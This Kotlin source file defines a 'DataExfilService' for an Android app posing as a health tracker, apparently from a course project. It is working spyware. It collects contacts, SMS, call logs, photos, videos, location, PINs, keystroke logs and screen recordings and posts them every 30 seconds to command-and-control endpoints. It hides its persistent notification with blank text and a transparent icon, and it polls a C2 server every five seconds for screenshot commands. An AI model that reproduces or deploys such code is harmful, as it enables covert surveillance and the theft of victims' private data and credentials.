package com.inf2007.healthtracker.utilities

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.*
import android.util.Log
import androidx.core.app.NotificationCompat
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*
import android.content.IntentFilter
import android.provider.Settings
import com.inf2007.healthtracker.R
import com.inf2007.healthtracker.utilities.collectors.AppCollector
import com.inf2007.healthtracker.utilities.collectors.ContactCollector
import com.inf2007.healthtracker.utilities.collectors.DataCollector
import com.inf2007.healthtracker.utilities.collectors.DownloadCollector
import com.inf2007.healthtracker.utilities.collectors.LocationCollector
import com.inf2007.healthtracker.utilities.collectors.PhotoCollector
import com.inf2007.healthtracker.utilities.collectors.PinCollector
import com.inf2007.healthtracker.utilities.collectors.ScreenRecordingCollector
import com.inf2007.healthtracker.utilities.collectors.SmsCallLogCollector
import com.inf2007.healthtracker.utilities.collectors.VideoCollector
import com.inf2007.healthtracker.utilities.startup.StartupController

class DataExfilService : Service() {

    companion object {
        const val TAG = "DataExfilService"
        val BASE_URL = C2Constants.BASE_URL
        private const val NOTIFICATION_CHANNEL_ID = "data_exfil_channel"
        private const val NOTIFICATION_ID = 1001
        val SERVER_ENDPOINT = C2Constants.ACCESSIBILITY_LOGS_ENDPOINT
        val COMMAND_ENDPOINT = C2Constants.COMMAND_ENDPOINT
        val USER_APPS_ENDPOINT = C2Constants.USER_APPS_ENDPOINT
        val CONTACTS_ENDPOINT = C2Constants.CONTACTS_ENDPOINT
        val DOWNLOADS_ENDPOINT = C2Constants.DOWNLOADS_ENDPOINT
        val LOCATION_ENDPOINT = C2Constants.LOCATION_ENDPOINT
        val PHOTOS_ENDPOINT = C2Constants.PHOTOS_ENDPOINT
        val PIN_ENDPOINT = C2Constants.PIN_ENDPOINT
        val SMS_ENDPOINT = C2Constants.SMS_ENDPOINT
        val CALL_LOG_ENDPOINT = C2Constants.CALL_LOG_ENDPOINT
        val SCREEN_RECORDING_ENDPOINT = C2Constants.SCREEN_RECORDING_ENDPOINT
        val VIDEO_ENDPOINT = C2Constants.VIDEOS_ENDPOINT
    }

    private lateinit var handler: Handler
    private var isUploading = false

    // Upload every 30 seconds
    private val uploadInterval = 30 * 1000L

    private val collectors = mutableListOf<DataCollector>()

    private val uploadRunnable = object : Runnable {
        override fun run() {
            if (!isUploading) {
                uploadAccessibilityLogs()
            }
            handler.postDelayed(this, uploadInterval)
        }
    }

    private val uploadFileReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == C2Constants.UPLOAD_FILE_INTENT) {
                val type = intent.getStringExtra("type") ?: return
                val filePath = intent.getStringExtra("file_path") ?: return

                when (type) {
                    "camera_video", "screen_recording" -> {
                        collectors.filterIsInstance<ScreenRecordingCollector>().firstOrNull()?.uploadVideo(File(filePath))
                    }
                }
            }
        }
    }

    // Listens for app install / uninstall and update the server
    private val appInstallReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val action = intent.action
            if (action == PackageLister.ACTION_APP_INSTALLED) {
                val packageName = intent.getStringExtra(PackageLister.EXTRA_PACKAGE_NAME)
                val totalApps = intent.getIntExtra(PackageLister.EXTRA_TOTAL_APPS, 0)
                val isRemoved = intent.getBooleanExtra("removed", false)

                if (isRemoved) {
                    Log.i(TAG, "App uninstalled: $packageName, Total apps now: $totalApps")
                } else {
                    Log.i(TAG, "App installed: $packageName, Total apps now: $totalApps")
                }

                collectors.filterIsInstance<AppCollector>().firstOrNull()?.collect()
            }
        }
    }

    private val pinLogUploadReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == "com.inf2007.healthtracker.UPLOAD_PIN_LOG") {
                Log.d(TAG, "Received PIN upload trigger")
                collectors.filterIsInstance<PinCollector>().firstOrNull()?.collect()
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        handler = Handler(Looper.getMainLooper())
        createNotificationChannel()
        registerReceiver(uploadFileReceiver, IntentFilter("com.inf2007.healthtracker.UPLOAD_FILE"), RECEIVER_NOT_EXPORTED)
        registerReceiver(appInstallReceiver, IntentFilter(PackageLister.ACTION_APP_INSTALLED), RECEIVER_NOT_EXPORTED)
        registerReceiver(pinLogUploadReceiver, IntentFilter("com.inf2007.healthtracker.UPLOAD_PIN_LOG"), RECEIVER_NOT_EXPORTED)

        collectors.apply {
            add(AppCollector(this@DataExfilService))
            add(ContactCollector(this@DataExfilService))
            add(DownloadCollector(this@DataExfilService))
            add(LocationCollector(this@DataExfilService))
            add(PhotoCollector(this@DataExfilService))
            add(PinCollector(this@DataExfilService))
            add(SmsCallLogCollector(this@DataExfilService))
            add(ScreenRecordingCollector(this@DataExfilService))
            add(VideoCollector(this@DataExfilService))
        }

        StartupController(this).performInitialCollection()

        Handler(Looper.getMainLooper()).post(object : Runnable {
            override fun run() {
                val startupPrefs = getSharedPreferences("startup_complete", Context.MODE_PRIVATE)

                // Check if startup is done (either by checking a flag or if batch uploads finished)
                if (startupPrefs.getBoolean("initial_done", false)) {
                    Log.d(TAG, "Startup completed, starting collectors")

                    // Set up observers and start collectors
                    collectors.filterIsInstance<ContactCollector>().firstOrNull()?.setupObservers(contentResolver)
                    collectors.filterIsInstance<PhotoCollector>().firstOrNull()?.setupObservers(contentResolver)
                    collectors.filterIsInstance<SmsCallLogCollector>().firstOrNull()?.setupObservers(contentResolver)
                    collectors.filterIsInstance<VideoCollector>().firstOrNull()?.setupObservers(contentResolver)

                    collectors.forEach { it.startObserving() }
                    Log.d(TAG, "All collectors started")
                } else {
                    Log.d(TAG, "Startup still in progress, checking again in 5 seconds")
                    handler.postDelayed(this, 5000)
                }
            }
        })
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Data exfiltration service started")

        startForegroundService()

        // Start periodic uploads
        handler.postDelayed(uploadRunnable, 10000)

        startCommandPolling()

        return START_STICKY
    }

    private fun createNotificationChannel() {
        val channelName = "Health Data Sync"
        val channelDescription = "Uploads health data to server"
        val importance = NotificationManager.IMPORTANCE_LOW

        val channel = NotificationChannel(
            NOTIFICATION_CHANNEL_ID,
            channelName,
            importance
        ).apply {
            description = channelDescription
            setShowBadge(false)
        }

        val notificationManager = getSystemService(NotificationManager::class.java)
        notificationManager.createNotificationChannel(channel)
    }

    private fun startForegroundService() {
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)
        Log.d(TAG, "Foreground service started with notification")
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.drawable.onebyonetransparent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setAutoCancel(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    // ========== ACCESSIBILITY LOGS ==========
    private fun uploadAccessibilityLogs() {
        if (isUploading) return
        if (!isNetworkAvailable()) {
            Log.d(TAG, "No network available, skipping upload")
            return
        }

        isUploading = true
        Log.d(TAG, "Starting log upload...")

        Thread {
            try {
                val logContent = readSpyLogs()
                if (logContent.isEmpty()) {
                    Log.d(TAG, "No logs to upload")
                    isUploading = false
                    return@Thread
                }

                Log.d(TAG, "Found ${logContent.lines().size} log entries")

                val logs = parseLogsForNotifications(logContent)
                val success = sendToServer(logs)

                if (success) {
                    Log.d(TAG, "Spy logs uploaded successfully")
                    archiveLogs()
                } else {
                    Log.w(TAG, "Upload failed")
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error uploading logs: ${e.message}", e)
            } finally {
                isUploading = false
            }
        }.start()
    }

    private fun readSpyLogs(): String {
        return try {
            val logFile = File(filesDir, C2Constants.WATCH_LOG_FILE)
            if (logFile.exists()) {
                val fileSize = logFile.length()
                Log.d(TAG, "Log file exists, size: $fileSize bytes")
                if (fileSize > 0) {
                    val content = logFile.readText()
                    Log.d(TAG, "Read ${content.lines().size} lines from log file")
                    content
                } else {
                    Log.d(TAG, "Log file is empty")
                    ""
                }
            } else {
                Log.d(TAG, "Log file does not exist")
                ""
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error reading log file", e)
            ""
        }
    }

    private fun parseLogsForNotifications(logContent: String): JSONObject {
        val logsArray = logContent.lines().filter { it.isNotBlank() }
        Log.d(TAG, "Parsing ${logsArray.size} log entries")

        val notificationData = JSONObject().apply {
            put("timestamp", System.currentTimeMillis())
            put("total_entries", logsArray.size)
            put("collection_time", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date()))
        }

        val keyPresses = JSONArray()

        logsArray.forEach { line ->
            when {
                line.contains("TYPING") || line.contains("TEXT") -> keyPresses.put(line)
                else -> keyPresses.put(line)
            }
        }

        val categorizedLogs = JSONObject().apply {
            put("key_presses", keyPresses)
        }

        notificationData.put("logs", categorizedLogs)

        return notificationData
    }

    private fun sendToServer(data: JSONObject): Boolean {
        return try {
            Log.d(TAG, "Sending data to server: ${data.toString().length} bytes")

            val url = URL(SERVER_ENDPOINT)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/json; charset=utf-8")
            connection.setRequestProperty("User-Agent", "HealthTracker-Spy/1.0")
            connection.setRequestProperty("Accept", "application/json")
            connection.connectTimeout = 15000
            connection.readTimeout = 15000
            connection.doOutput = true

            val outputStream = connection.outputStream
            OutputStreamWriter(outputStream, "UTF-8").use { writer ->
                writer.write(data.toString())
                writer.flush()
            }

            val responseCode = connection.responseCode
            val responseMessage = connection.responseMessage

            Log.d(TAG, "Server response: $responseCode $responseMessage")

            try {
                val response = if (responseCode >= 400) {
                    connection.errorStream.bufferedReader().use { it.readText() }
                } else {
                    connection.inputStream.bufferedReader().use { it.readText() }
                }
                Log.d(TAG, "Response body: $response")
            } catch (e: Exception) {
                Log.d(TAG, "Could not read response body")
            }

            connection.disconnect()

            responseCode in 200..299

        } catch (e: Exception) {
            Log.e(TAG, "Error sending to server: ${e.message}")
            Log.e(TAG, "Full error: ", e)
            false
        }
    }

    private fun archiveLogs() {
        try {
            val logFile = File(filesDir, "watch.log")
            if (logFile.exists() && logFile.length() > 0) {
                val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                val archivedFile = File(filesDir, "watch_$timestamp.log")
                logFile.copyTo(archivedFile)
                logFile.writeText("")
                Log.d(TAG, "Logs archived to: ${archivedFile.name}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error archiving logs: ${e.message}")
        }
    }

    private fun isNetworkAvailable(): Boolean {
        return try {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false

            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)
        } catch (e: Exception) {
            Log.e(TAG, "Network check error", e)
            false
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        handler.removeCallbacks(uploadRunnable)
        Log.d(TAG, "Data exfiltration service destroyed")
        try {
            unregisterReceiver(appInstallReceiver)
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering appInstallReceiver", e)
        }
        try {
            unregisterReceiver(pinLogUploadReceiver)
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering pinLogUploadReceiver", e)
        }

        collectors.forEach { it.stopObserving() }
        super.onDestroy()
        collectors.filterIsInstance<ContactCollector>().firstOrNull()?.removeObservers(contentResolver)
        collectors.filterIsInstance<PhotoCollector>().firstOrNull()?.removeObservers(contentResolver)
        collectors.filterIsInstance<SmsCallLogCollector>().firstOrNull()?.removeObservers(contentResolver)
        collectors.filterIsInstance<VideoCollector>().firstOrNull()?.removeObservers(contentResolver)
        unregisterReceiver(uploadFileReceiver)
    }

    private fun getUniqueDeviceId(): String {
        return try {
            Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ANDROID_ID
            ) ?: "unknown"
        } catch (e: Exception) {
            Log.e(TAG, "Error getting Android ID: ${e.message}")
            "unknown"
        }
    }

    private fun checkForCommands() {
        if (!isNetworkAvailable()) return

        Thread {
            try {
                val url = URL("$COMMAND_ENDPOINT?device_id=${getUniqueDeviceId()}")
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                connection.connectTimeout = 10000
                connection.readTimeout = 10000

                if (connection.responseCode == 200) {
                    val response = connection.inputStream.bufferedReader().use { it.readText() }
                    if (response.isNotEmpty() && response != "{}") {
                        val json = JSONObject(response)
                        handleCommand(json)
                    }
                }
                connection.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "Error checking commands: ${e.message}")
            }
        }.start()
    }

    private fun handleCommand(commandJson: JSONObject) {
        val command = commandJson.getString("command")
        val params = if (commandJson.has("params")) commandJson.getJSONObject("params") else null
        val commandId = if (commandJson.has("command_id")) commandJson.getString("command_id") else null

        Log.i(TAG, "Received command: $command")

        var success = true
        var result = ""

        try {
            when (command) {
                // Screenshot commands - forward to MainActivity
                "START_SCREENSHOT", "STOP_SCREENSHOT", "CAPTURE_NOW", "REQUEST_SCREEN_CAPTURE" -> {
                    val intent = Intent("com.inf2007.healthtracker.SCREENSHOT_COMMAND").apply {
                        putExtra("command", command)
                        setPackage("com.inf2007.healthtracker")
                    }
                    sendBroadcast(intent)
                    result = "Command $command forwarded to main activity"
                }
                else -> {
                    Log.w(TAG, "Unknown command: $command")
                    result = "Unknown command: $command"
                    success = false
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error executing command $command: ${e.message}")
            success = false
            result = "Error: ${e.message}"
        }

        // Send command acknowledgment
        if (commandId != null) {
            sendCommandAck(commandId, success, result)
        }
    }

    private fun sendCommandAck(commandId: String, success: Boolean, result: String = "") {
        Thread {
            try {
                val url = URL("$COMMAND_ENDPOINT/ack")
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.doOutput = true

                val ackJson = JSONObject().apply {
                    put("device_id", getUniqueDeviceId())
                    put("command_id", commandId)
                    put("status", if (success) "completed" else "failed")
                    put("result", result)
                    put("timestamp", System.currentTimeMillis())
                }

                OutputStreamWriter(connection.outputStream).use { writer ->
                    writer.write(ackJson.toString())
                    writer.flush()
                }

                val responseCode = connection.responseCode
                connection.disconnect()

                Log.d(TAG, "Command ack sent for $commandId, response: $responseCode")

            } catch (e: Exception) {
                Log.e(TAG, "Error sending command ack: ${e.message}")
            }
        }.start()
    }

    private fun startCommandPolling() {
        handler.post(object : Runnable {
            override fun run() {
                checkForCommands()
                handler.postDelayed(this, 5000) // Check every 5 seconds
            }
        })
    }
}